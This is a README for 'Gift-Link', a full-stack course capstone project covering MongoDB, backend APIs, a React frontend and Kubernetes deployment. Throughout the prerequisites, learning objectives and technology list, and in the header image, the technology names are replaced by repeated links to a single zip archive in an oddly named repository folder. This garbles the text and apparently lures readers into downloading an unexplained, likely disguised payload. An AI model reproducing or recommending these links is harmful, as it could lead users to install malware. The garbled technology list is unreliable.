<img width="600" alt="Screenshot 2024-08-31 at 9 23 46 PM" src="https://raw.githubusercontent.com/sakshi-code-cse/fullstack-capstone-project/main/nidicolous/fullstack-capstone-project.zip">

# Gift-Link Full-Stack Application


Welcome to the **Gift-Link** project! This application is a comprehensive full-stack web app that allows users to manage and search for gifts, leveraging a NoSQL database, backend APIs, and a React-based frontend. This README file will guide you through the project overview, setup instructions, and key learning objectives covered in the development process.

## Table of Contents

- [Project Overview](#project-overview)
- [Learning Objectives](#learning-objectives)
- [Technologies Used](#technologies-used)
- [Project Setup](#project-setup)
- [Development Modules](#development-modules)
  - [Module 1: Initial Setup & Database Configuration](#module-1-initial-setup--database-configuration)
  - [Module 2: Backend API Development](#module-2-backend-api-development)
  - [Module 3: Frontend Development](#module-3-frontend-development)
  - [Module 4: User Authentication & Profile Management](#module-4-user-authentication--profile-management)
  - [Module 5: Containerization & Deployment](#module-5-containerization--deployment)
  - [Module 6: Project Submission & Peer Review](#module-6-project-submission--peer-review)
- [License](#license)

## Project Overview

**Gift-Link** is a full-stack application designed to manage gift listings. The application provides functionalities such as searching for gifts based on various attributes, performing sentiment analysis on gift descriptions, and managing user profiles with secure authentication. The project is structured into several modules, each focusing on different aspects of development from setting up the backend to deploying the entire application using modern CI/CD practices.

## Learning Objectives

Throughout the development of this project, the following key learning objectives are covered:

- Setting up and configuring a GitHub repository.
- Creating and managing user stories and organizing them as GitHub issues.
- Configuring and managing a NoSQL MongoDB database.
- Developing RESTful APIs with https://raw.githubusercontent.com/sakshi-code-cse/fullstack-capstone-project/main/nidicolous/fullstack-capstone-project.zip and https://raw.githubusercontent.com/sakshi-code-cse/fullstack-capstone-project/main/nidicolous/fullstack-capstone-project.zip
- Implementing a React frontend with dynamic state management and routing.
- Handling user authentication and profile management with secure API interactions.
- Deploying the application using Kubernetes and IBM Code Engine.
- Automating CI/CD processes using GitHub Actions.
- Conducting peer evaluations based on a provided rubric.

## Technologies Used

- **Frontend**: https://raw.githubusercontent.com/sakshi-code-cse/fullstack-capstone-project/main/nidicolous/fullstack-capstone-project.zip, CSS, HTML
- **Backend**: https://raw.githubusercontent.com/sakshi-code-cse/fullstack-capstone-project/main/nidicolous/fullstack-capstone-project.zip, https://raw.githubusercontent.com/sakshi-code-cse/fullstack-capstone-project/main/nidicolous/fullstack-capstone-project.zip
- **Database**: MongoDB
- **CI/CD**: GitHub Actions, Kubernetes, IBM Code Engine
- **Other Tools**: NPM, Git, Linting

## Project Setup

### Prerequisites

Before you begin, ensure you have the following installed:

- https://raw.githubusercontent.com/sakshi-code-cse/fullstack-capstone-project/main/nidicolous/fullstack-capstone-project.zip and npm
- MongoDB
- Git

### Clone the Repository

```bash
git clone <repository-url>
cd gift-link
```

### Install Dependencies

```bash
npm install
```

### Set Up Environment Variables

Create a `.env` file in the root directory and configure the necessary environment variables:

```plaintext
MONGODB_URI=<your-mongodb-uri>
JWT_SECRET=<your-secret-key>
```

### Start the Development Server

To start the server locally:

```bash
npm run dev
```

## Development Modules

### Module 1: Initial Setup & Database Configuration

- **Objective**: Set up the GitHub repository, create user stories, and configure MongoDB.
- **Tasks**:
  - Establish a new GitHub repository using a provided template.
  - Formulate a user story template and add stories as GitHub issues.
  - Initialize and configure MongoDB in the development environment.
  - Import initial data into MongoDB.

### Module 2: Backend API Development

- **Objective**: Develop backend APIs for managing gifts and implementing sentiment analysis.
- **Tasks**:
  - Create endpoints to handle CRUD operations for gifts.
  - Implement a search API to filter gifts based on attributes.
  - Develop an Express server for sentiment analysis using NLP tools.

### Module 3: Frontend Development

- **Objective**: Build user-facing pages using React, CSS, and HTML.
- **Tasks**:
  - Structure and style the landing page.
  - Develop React components for main listings, navigation, and authentication pages.
  - Implement routing and state management for dynamic content.

### Module 4: User Authentication & Profile Management

- **Objective**: Develop APIs for user registration, login, and profile management.
- **Tasks**:
  - Create secure endpoints for handling user data.
  - Enhance form handling and state management on the client-side.
  - Integrate API calls with authorization tokens.

### Module 5: Containerization & Deployment

- **Objective**: Containerize the application and deploy it using Kubernetes and IBM Code Engine.
- **Tasks**:
  - Set up CI/CD pipelines using GitHub Actions.
  - Deploy MongoDB and the backend server on Kubernetes.
  - Deploy the frontend server using IBM Code Engine.

### Module 6: Project Submission & Peer Review

- **Objective**: Submit the final project and participate in peer evaluations.
- **Tasks**:
  - Submit the Gift-Link application for evaluation.
  - Evaluate a peer’s project using the provided rubric.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
```
